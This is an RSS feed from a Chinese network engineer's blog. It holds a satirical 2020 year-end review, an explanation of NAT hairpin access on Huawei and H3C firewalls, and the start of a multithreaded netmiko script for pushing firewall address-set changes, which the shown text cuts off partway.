<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CodeShurrik</title>
    <description>shurrik blog</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 19 Feb 2021 11:14:05 +0800</pubDate>
    <lastBuildDate>Fri, 19 Feb 2021 11:14:05 +0800</lastBuildDate>
    <generator>Jekyll v3.8.6</generator>
    
      <item>
        <title>2020年终总结</title>
        <description>&lt;p&gt;2020年完成了4个项目，都是扩容项目，也就是不断地堆设备，总计网络设备小1000台吧，新建了3个IDC机房。&lt;/p&gt;

&lt;p&gt;关于学习方面，今年学习的内容不算多，除了本职工作，就是零零散散的VXLAN、Vmware、Python，自动化监控这些东西了。&lt;/p&gt;

&lt;p&gt;物联网工作两年，近期也算是稳定了下来。不过稳定的另一个意思就是原地踏步，既然暂时无法有质的突破，那就研究一下如何拉低其他人(&lt;del&gt;阴险笑&lt;/del&gt;)，以下为秘籍：&lt;/p&gt;

&lt;p&gt;要超过大多数人其实是比较简单的，尤其在今天的中国，更是简单。因为，只要看看中国的互联网，你就会发现，他们基本上全部都是在消费大众，让大众变得更为地愚蠢和傻瓜。&lt;strong&gt;所以，在今天的中国，你基本上不用做什么，只需要不使用中国互联网，你就很自然地超过大多数人了&lt;/strong&gt;。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在信息获取上，你要不断地向大众鼓吹下面的这些事：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;让大家都用百度查找信息，订阅微信公众号或是到知乎上学习知识……要做到这一步，你就需要把“百度一下”挂在嘴边，然后要经常在群或朋友圈中转发微信公众号的文章，并且转发知乎里的各种“如何看待……”这样的文章。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让大家到微博或是知识星球上粉一些大咖，密切关注他们的言论和动向……是的，告诉大家，大咖的任何想法一言一行都可以在微博、朋友圈或是知识星球上获得，让大家相信，你的成长和大咖的见闻和闲扯非常有关系，你跟牛人在一个圈子里你也会变牛B。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;把快手和抖音这样的APP推荐给大家……你只需要让朋友成功地安装这两个APP，他们就会花大量的时间在上面，而不能自拔。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让大家热爱八卦，职场见闻，社会热点，争议话题，这些东西总会让人心态有很多微妙的变化，甚至花大量的时间去搜索和阅读大量的观点，以及花大量时间与人辩论争论，这个过程会让人上瘾，让人欲罢不能，然而这些事却和自己没有半毛钱关系。你要做的事就是转发其中一些SB或是很极端的观点，造成大家的一睦讨论后，就早早离场，也就是所谓的带节奏。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;利用爱国主义，让大家觉得不用学英文，不用出国，不用翻墙，咱们已经是强国了……现在这种后疫情时代，这点还是很容易做到的。所以，只要你鼓吹那些英文无用论，出国活得更惨，国家变得很强大，就算自己过得很底层，也有大国人民的感觉。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;然后，在知识学习上，让他们不得要领并产生幻觉:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;让他们混淆认识和知识，以为开阔认知就是学习，让他们有学习和成长的幻觉&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;不断地给他们各种各样“有价值的学习资料”，让他们抓不住重点，成为一个微信公众号或电子书“收藏家”&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让他们看一些枯燥无味的基础知识和硬核知识，这样让他们只会用“死记硬背”的方式来学习，甚至直接让他们失去信心，直接放弃……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让他们喜欢直接得到答案的工作和学习方式，成为一个伸手党，从此学习再也不思考……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;告诉他们东西做出来就好了，不要追求做漂亮，做优雅，这样他们就会慢慢地变成劳动密集型……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让他们觉得自己已经很努力了，剩下的就是运气，并说服他们去及时行乐……&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;最后，在认知和格局上，彻底打垮他们，让他们变成韭菜:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;让他们尽可能地用拼命和加班，尽可能的996，并告诉他们这就是通往成功的唯一路径。这样一来，他们必然会被永远困在低端成为最低的劳动力。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;宣扬一夜暴富以及快速挣钱的案例，最好让他们进入“赌博类”或是“传销类”的地方，比如：股市、比特币……要让他们相信各种财富神话，相信他们就是那个幸运儿，他们也可以成为巴菲特，可以成为马云……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;告诉他们，一些看上去很难的事都是有捷径的，比如：21天就能学会机器学习，用区块链就能颠覆以及重构整个世界等等……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;多跟他们讲一些小人物的励志的故事，这样让他们相信，不需要学习高级知识，不需要掌握高级技能，只需要用低等的知识和低级的技能，再加上持续不断拼命重复现有的工作，终有一天就会成功……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让他们到体制内的一些非常稳定的地方工作，这样他们拥有不思进取、怕承担责任、害怕犯错、喜欢偷懒、得过且过的素质……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;让他们到体制外的那些喜欢拼命喜欢加班的地方工作，告诉他们爱拼才会赢，996是一种福报，青春就是用来拼的，让他们喜欢上使蛮力的感觉……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;告诉他们，你现有的技能和知识不用更新，就能过好一辈子，新出来的东西没有生命力的……这样他们就会像我们再也不学习的父辈一样很快就会被时代所抛弃……&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每个人都喜欢在一些自己做不到的事上找理由，这种能力不教就会，比如，事情太多没有时间，因为工作上没有用到，等等。你要做的就是帮他们为他们做不到的事找各种非常合理的理由，比如：没事的，一切都是最好的安排；你得不到的那个事没什么意思；你没有面好主要原因是那个面试官问的问题都是可以上网查得到的知识，而不没有问到你真正的能力上；这些东西学了不用很快会忘了，等有了环境再学也不迟……&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;最后也提醒自己一下，上述的这些“秘籍”要小心，是所谓，贩毒的人从来不吸毒，开赌场的人从来不赌博！所以，要小心别自己也掉进去了！这就是“欲练神功，必先自宫”的道理。&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 18 Feb 2021 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2021-02-18/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
        <guid isPermaLink="true">http://localhost:4000/2021-02-18/2020%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
        
        <category>年终总结</category>
        
        
        <category>水</category>
        
      </item>
    
      <item>
        <title>NAT访问回流问题</title>
        <description>&lt;p&gt;最近又遇到一个需求，抽象出来就是一台内网服务器需要通过公网ip访问另一台内网服务器的公网映射，实现特定的业务。网上查了下，这种需求被称为nat回流。&lt;/p&gt;

&lt;p&gt;一般有两种方式&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;通过域名访问，可以加host或者dns将域名解析为内网ip&lt;/li&gt;
    &lt;li&gt;通过ip访问，华为防火墙多配置一条域内源nat策略；H3C防火墙在内网接口再做一次nat server同时加域内源nat。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;简单分析一下，假设一个简单的网络环境，内网用户ip：&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt; 内网服务器ip：&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.2&lt;/code&gt;，服务端口：https(443) 公网ip：&lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;内网用户通过snat将内网ip替换成&lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1&lt;/code&gt; 来上外网，外面的用户通过nat server &lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1:443&lt;/code&gt; —-&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.2:443&lt;/code&gt; 来访问暴露在公网的内部服务。内部用户能上网了，外面人可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1&lt;/code&gt; 来访问内部服务了。那么问题来了，内网用户能通过&lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1:443&lt;/code&gt; 来访问内部的服务吗?&lt;/p&gt;

&lt;p&gt;结果很明显，不能。&lt;/p&gt;

&lt;p&gt;那么为什么呢？&lt;/p&gt;

&lt;p&gt;简单来说是因为TCP不能建立连接，内网用户&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt;–&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1:443&lt;/code&gt;，在防火墙上nat server后，目的ip变成了&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.2&lt;/code&gt;，由内部网络将tcp握手报文发给了&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.2&lt;/code&gt;，1.2收到报文后回包，发现源ip是&lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt;，因为服务器和用户在同一网络，服务器之间走本地路由将报文发给了用户，这时候问题来了，用户是想和&lt;code class=&quot;highlighter-rouge&quot;&gt;100.1.1.1&lt;/code&gt;来建立连接，但是结果是1.2给回的包，也就是来回路径不一致，TCP 握手没办法建立连接。&lt;/p&gt;
</description>
        <pubDate>Tue, 22 Dec 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-12-22/NAT%E8%AE%BF%E9%97%AE%E5%9B%9E%E6%B5%81%E9%97%AE%E9%A2%98/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-12-22/NAT%E8%AE%BF%E9%97%AE%E5%9B%9E%E6%B5%81%E9%97%AE%E9%A2%98/</guid>
        
        <category>NAT</category>
        
        
        <category>网络</category>
        
      </item>
    
      <item>
        <title>网络工程师的python之路</title>
        <description>&lt;p&gt;　　最近有个需求，需要重复的对某几台防火墙进行某些操作，为了让不懂网络设备的同事也能一键操作，尝试了用python开发脚本，TODO：后续可以考虑弄个web界面，更友好。&lt;/p&gt;

&lt;p&gt;　　一开始使用netmiko模块，1台设备执行1条命令需要20-30秒，N台设备*N，况且命令条数也是动态的，这样操作怕不是还没有手动快。同步不行就异步吧，后来研究了下netdev模块，功能实现后发现一个致命问题，&lt;del&gt;截止目前为止netdev还不支持huawei的操作系统(&lt;a href=&quot;https://github.com/selfuryon/netdev/issues/45&quot;&gt;已经向作者提交issue&lt;/a&gt;)，没办法还是换回netmiko。&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;　　9.14更新，为netdev库增加了华为设备的支持，服务端用aiohttp，改为异步并发，速度快到不知哪去了(&lt;a href=&quot;https://github.com/selfuryon/netdev/pull/48&quot;&gt;已经向作者提交PR&lt;/a&gt;)。后面有空再深入了解下asyncio~~&lt;/p&gt;

&lt;p&gt;　　没法异步，要提高处理速度只有多线程，&lt;del&gt;能异步当然还是异步快&lt;/del&gt; 为了避免线程间数据同步以及复杂情况下线程锁的问题，最后用1个线程操作1台设备的方法，代码如下：&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;netmiko&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConnectHandler&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;queue&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Queue&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;threading&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fengdu_hw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;net_connect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConnectHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ip_list.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;#要配置的命令
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;config_commands&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'ip address-set fengdu_20200821_1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                               &lt;span class=&quot;s&quot;&gt;'address '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' 0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;#提交要配置的命令，input为提交的真实内容
&lt;/span&gt;            &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net_connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_config_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{ip} 操作失败，请检查！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{ip} 操作成功！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;fengdu_h3c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_q&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;net_connect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ConnectHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ip_list.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;#要配置的命令
&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;config_commands&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'object-group ip address fengdu_20200821_1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                               &lt;span class=&quot;s&quot;&gt;'network host address '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;#提交要配置的命令，input为提交的真实内容
&lt;/span&gt;            &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;net_connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_config_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;config_commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{ip} 操作失败，请检查！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{ip} 操作成功！&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;hw1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'device_type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'huawei'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X.X.X.X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hw2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'device_type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'huawei'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X.X.X.X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hw3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'device_type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'huawei'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X.X.X.X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;h3c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'device_type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hp_comware'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X.X.X.X'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'xxxxx'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;操作于 {time.strftime('&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X')} 开始执行&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fengdu_hw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
